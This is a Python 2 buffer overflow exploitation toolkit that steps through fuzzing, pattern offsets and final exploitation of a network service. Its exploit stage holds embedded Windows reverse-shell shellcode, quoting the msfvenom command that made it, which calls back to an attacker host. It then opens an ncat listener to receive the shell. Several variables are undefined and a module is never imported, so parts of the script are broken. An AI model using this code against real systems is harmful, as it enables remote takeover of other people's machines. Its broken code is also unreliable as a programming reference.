#!/usr/bin/python
# Buffer Overflow Toolkit
# author: Elijah Seymour
# 
# Just a simple toolkit to assist me in detecting and exploiting buffer overflows
# Todo: more automation, egghunting, automatic payloads, class system
# Really hacky right now.
import sys
import socket
from time import sleep
from subprocess import call
import struct
import argparse
parser = argparse.ArgumentParser(prog="bof")
parser.add_argument('--stage', type=int, help='Define the stage of the exploit: 1 = fuzz, 2 = pattern, 3 = offset, 4 = badchars, 5 = exploit')
parser.add_argument('--ip', type=str, help='IP Address')
parser.add_argument('--port', type=int, help='Port')
parser.add_argument('--bytes', type=int, help='Bytes to send before payload')
parser.add_argument('--address', type=str, help='Return address')
parser.add_argument('--nops', type=int, help='nopsled')
args = vars(parser.parse_args())
args = { k: args[k] for k in args if args[k] != None }
if args["stage"] == 1:
	if any(k not in args for k in {"ip", "port", "bytes"}):
		parser.print_help()
		sys.exit()
	buffer = ["A"]
	while len(buffer) <= 40:
		buffer.append("A" * args["bytes"])
		args["bytes"] += 200
	try:
		for bytes in buffer:
			print "[x] Throwing {} bytes at socket...".format(len(bytes))
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((args["ip"], args["port"]))
			s.recv(1024)
			s.send('{}\r\n'.format(bytes))
			s.recv(1024)
			s.send('QUIT\r\n')
			s.close()
	except:
		print "[!] Crashed with {} bytes.".format(len(bytes))
elif args["stage"] == 2:
	if any(k not in args for k in {"ip", "port", "bytes"}):
		parser.print_help()
		sys.exit()
	try:
		pattern = subprocess.Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", args["bytes"]], stdout=subprocess.PIPE)
		payload = pattern.stdout.read()
		print "[*] Connecting to {}...".format(args["ip"])
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((args["ip"], args["port"]))
		banner = s.recv(1024)
		print "[x] Connected to {}".format(banner)
		print "[*] Sending payload..."
		s.send(payload)
		s.close()
		print "[x] Payload delivered, check your debugger to read the value of the instruction pointer" 
	except:
		print "[!] Connection failed"
elif args["stage"] == 3:
	if any(k not in args for k in {"address"}):
		parser.print_help()
		sys.exit()
	try:
		offset = subprocess.Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb", "-q", ADDRESS], stdout=subprocess.PIPE)
		output = OFFSET.stdout.read()
		print "[x] {}".format(output)
	except:
		print "[!] Unable to get offset"
elif args["stage"] == 4:
	print "not implemented"
	pass
elif args["stage"] == 5:
	if any(k not in args for k in {"ip", "port", "bytes", "address", "nops"}):
		parser.print_help()
		sys.exit()
	return_addr = struct.pack('<L', int("0x" + args["address"], 0))
	nopsled = "\x90" * args["nops"]
	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.232 LPORT=54321 -f python -e x86/shikata_ga_nai -a x86 --platform Windows -b "\x00\x0a\x0d" -v shellcode
	# todo: helper function to generate payload
	shellcode =  ""
	shellcode += "\xba\x3f\xa3\x0e\x21\xda\xcc\xd9\x74\x24\xf4\x58"
	shellcode += "\x33\xc9\xb1\x52\x31\x50\x12\x83\xe8\xfc\x03\x6f"
	shellcode += "\xad\xec\xd4\x73\x59\x72\x16\x8b\x9a\x13\x9e\x6e"
	shellcode += "\xab\x13\xc4\xfb\x9c\xa3\x8e\xa9\x10\x4f\xc2\x59"
	shellcode += "\xa2\x3d\xcb\x6e\x03\x8b\x2d\x41\x94\xa0\x0e\xc0"
	shellcode += "\x16\xbb\x42\x22\x26\x74\x97\x23\x6f\x69\x5a\x71"
	shellcode += "\x38\xe5\xc9\x65\x4d\xb3\xd1\x0e\x1d\x55\x52\xf3"
	shellcode += "\xd6\x54\x73\xa2\x6d\x0f\x53\x45\xa1\x3b\xda\x5d"
	shellcode += "\xa6\x06\x94\xd6\x1c\xfc\x27\x3e\x6d\xfd\x84\x7f"
	shellcode += "\x41\x0c\xd4\xb8\x66\xef\xa3\xb0\x94\x92\xb3\x07"
	shellcode += "\xe6\x48\x31\x93\x40\x1a\xe1\x7f\x70\xcf\x74\xf4"
	shellcode += "\x7e\xa4\xf3\x52\x63\x3b\xd7\xe9\x9f\xb0\xd6\x3d"
	shellcode += "\x16\x82\xfc\x99\x72\x50\x9c\xb8\xde\x37\xa1\xda"
	shellcode += "\x80\xe8\x07\x91\x2d\xfc\x35\xf8\x39\x31\x74\x02"
	shellcode += "\xba\x5d\x0f\x71\x88\xc2\xbb\x1d\xa0\x8b\x65\xda"
	shellcode += "\xc7\xa1\xd2\x74\x36\x4a\x23\x5d\xfd\x1e\x73\xf5"
	shellcode += "\xd4\x1e\x18\x05\xd8\xca\x8f\x55\x76\xa5\x6f\x05"
	shellcode += "\x36\x15\x18\x4f\xb9\x4a\x38\x70\x13\xe3\xd3\x8b"
	shellcode += "\xf4\xcc\x8c\x92\xec\xa5\xce\x94\x38\x04\x46\x72"
	shellcode += "\xaa\x77\x0e\x2d\x43\xe1\x0b\xa5\xf2\xee\x81\xc0"
	shellcode += "\x35\x64\x26\x35\xfb\x8d\x43\x25\x6c\x7e\x1e\x17"
	shellcode += "\x3b\x81\xb4\x3f\xa7\x10\x53\xbf\xae\x08\xcc\xe8"
	shellcode += "\xe7\xff\x05\x7c\x1a\x59\xbc\x62\xe7\x3f\x87\x26"
	shellcode += "\x3c\xfc\x06\xa7\xb1\xb8\x2c\xb7\x0f\x40\x69\xe3"
	shellcode += "\xdf\x17\x27\x5d\xa6\xc1\x89\x37\x70\xbd\x43\xdf"
	shellcode += "\x05\x8d\x53\x99\x09\xd8\x25\x45\xbb\xb5\x73\x7a"
	shellcode += "\x74\x52\x74\x03\x68\xc2\x7b\xde\x28\xf2\x31\x42"
	shellcode += "\x18\x9b\x9f\x17\x18\xc6\x1f\xc2\x5f\xff\xa3\xe6"
	shellcode += "\x1f\x04\xbb\x83\x1a\x40\x7b\x78\x57\xd9\xee\x7e"
	shellcode += "\xc4\xda\x3a"
	PAYLOAD = "A" * args["bytes"] + return_addr + nopsled + shellcode
	try:
		print "[*] Connecting to {}...".format(HOST)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, int(PORT)))
		BANNER = s.recv(1024)
		print "[x] Connected to {}".format(BANNER)
		print "[*] Sending payload..."
		s.send(PAYLOAD)
		s.close()
		print "[x] Payload delivered"
		print "[*] Waiting for target to connect"
		try:
			sleep(1)
			call(["ncat", "-vlnp", "54321"])
		except:
			print "[!] Payload failed"
	except:
		print "[!] Connection failed"
else:
	parser.print_help()
	sys.exit()
